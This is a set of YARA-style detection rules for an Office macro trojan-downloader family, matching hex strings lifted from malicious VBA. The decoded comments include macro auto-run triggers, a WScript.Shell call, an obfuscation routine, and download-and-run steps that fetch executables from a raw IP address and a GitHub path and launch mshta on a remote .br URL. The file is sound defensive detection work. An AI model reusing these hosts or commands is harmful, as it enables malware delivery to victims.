
rule TrojanDownloader_O97M_EncDoc_RA_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {53 75 62 20 61 75 74 6f 5f 6f 70 65 6e 28 29 } //1 Sub auto_open()
		$a_01_1 = {44 69 6d 20 73 74 72 4d 61 63 72 6f 20 41 73 20 53 74 72 69 6e 67 } //1 Dim strMacro As String
		$a_03_2 = {53 68 65 65 74 73 28 31 29 2e 52 61 6e 67 65 28 22 45 35 38 30 22 29 2e 4e 61 6d 65 20 3d 20 22 41 75 74 6f 5f 6f 75 76 72 69 72 35 [30-39] 22 } //1
		$a_03_3 = {73 74 72 4d 61 63 72 6f 20 3d 20 22 41 75 74 6f 5f 6f 75 76 72 69 72 35 [30-39] 22 } //1
		$a_01_4 = {52 75 6e 20 28 73 74 72 4d 61 63 72 6f 29 } //1 Run (strMacro)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_EncDoc_RA_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 } //1 = CreateObject("WScript.Shell")
		$a_01_1 = {53 68 65 6c 6c 20 28 45 6e 76 69 72 6f 6e 28 22 54 65 6d 70 22 29 20 2b 20 22 5c 79 48 59 57 43 2e 62 61 74 22 29 } //1 Shell (Environ("Temp") + "\yHYWC.bat")
		$a_03_2 = {41 70 70 6c 69 63 61 74 69 6f 6e 2e 57 61 69 74 20 28 4e 6f 77 20 2b 20 54 69 6d 65 56 61 6c 75 65 28 22 30 3a 30 30 3a 90 10 02 00 22 29 29 } //1
		$a_03_3 = {2e 52 75 6e 20 28 [0-07] 28 22 90 1f 10 00 } //1
		$a_03_4 = {50 75 62 6c 69 63 20 53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 0d 0a 20 20 20 [0-05] 0d 0a 45 6e 64 20 53 75 62 0d 0a 50 72 69 76 61 74 65 20 53 75 62 20 90 1b 00 28 29 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*1+(#a_03_3  & 1)*1+(#a_03_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_EncDoc_RA_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_01_0 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 46 6f 76 4e 59 49 67 74 6e 4e 28 5a 65 65 6c 48 4e 6d 51 6e 64 20 41 73 20 53 74 72 69 6e 67 2c 20 55 67 68 77 48 78 73 20 41 73 20 53 74 72 69 6e 67 29 20 41 73 20 53 74 72 69 6e 67 } //1 Public Function FovNYIgtnN(ZeelHNmQnd As String, UghwHxs As String) As String
		$a_01_1 = {53 65 74 20 78 30 5a 41 64 4f 79 77 6d 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 55 67 68 77 48 78 73 29 } //1 Set x0ZAdOywm = CreateObject(UghwHxs)
		$a_01_2 = {79 78 62 73 54 70 61 47 6b 4a 20 3d 20 41 72 72 61 79 28 5a 65 65 6c 48 4e 6d 51 6e 64 29 } //1 yxbsTpaGkJ = Array(ZeelHNmQnd)
		$a_01_3 = {2e 50 61 74 74 65 72 6e 20 3d 20 22 42 7c 59 7c 55 7c 76 7c 77 7c 44 7c 71 7c 56 7c 46 7c 6a 7c 50 7c 49 7c 58 7c 4c 7c 4f 7c 51 7c 47 7c 4d 7c 4e 7c 4b 7c 48 7c 7a 7c 5a 22 } //1 .Pattern = "B|Y|U|v|w|D|q|V|F|j|P|I|X|L|O|Q|G|M|N|K|H|z|Z"
		$a_01_4 = {46 6f 76 4e 59 49 67 74 6e 4e 20 3d 20 78 30 5a 41 64 4f 79 77 6d 2e 52 65 70 6c 61 63 65 28 79 78 62 73 54 70 61 47 6b 4a 28 30 29 2c 20 22 22 29 } //1 FovNYIgtnN = x0ZAdOywm.Replace(yxbsTpaGkJ(0), "")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_EncDoc_RA_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.RA!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 04 00 00 "
		
	strings :
		$a_01_0 = {3d 20 45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c 62 6c 61 2e 65 78 65 22 } //1 = Environ("TEMP") & "\bla.exe"
		$a_03_1 = {67 69 74 68 75 62 2e 63 6f 6d 2f 74 63 6f 6e 71 75 65 72 6f 72 2f 62 6c 61 2f 72 61 77 2f 6d 61 73 74 65 72 2f 41 75 74 6f 72 75 6e 73 2e 65 78 65 22 2c 20 46 4e 61 6d 65 2c 20 30 2c 20 30 29 90 0a 8f 00 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 73 3a 2f 2f } //1
		$a_01_2 = {68 74 74 70 3a 2f 2f 34 35 2e 38 35 2e 39 30 2e 31 34 2f 69 38 38 2f 52 6d 63 70 67 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 20 26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 22 20 26 20 43 68 72 28 33 34 29 20 26 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 66 61 73 74 65 64 67 65 2e 65 78 22 } //2 http://45.85.90.14/i88/Rmcpg.ex" & Chr(101) & Chr(34) & " -Destination " & Chr(34) & "C:\Users\Public\Documents\fastedge.ex"
		$a_01_3 = {2e 53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 6d 73 68 74 61 22 2c 20 22 68 74 74 70 3a 2f 2f 66 61 63 65 78 74 72 61 64 65 2e 63 6f 6d 2e 62 72 2f 67 6f 6f 67 6c 65 2e 74 78 74 22 2c 20 22 22 2c 20 22 6f 70 65 6e 22 2c 20 31 } //2 .ShellExecute "mshta", "http://facextrade.com.br/google.txt", "", "open", 1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_01_2  & 1)*2+(#a_01_3  & 1)*2) >=2
 
}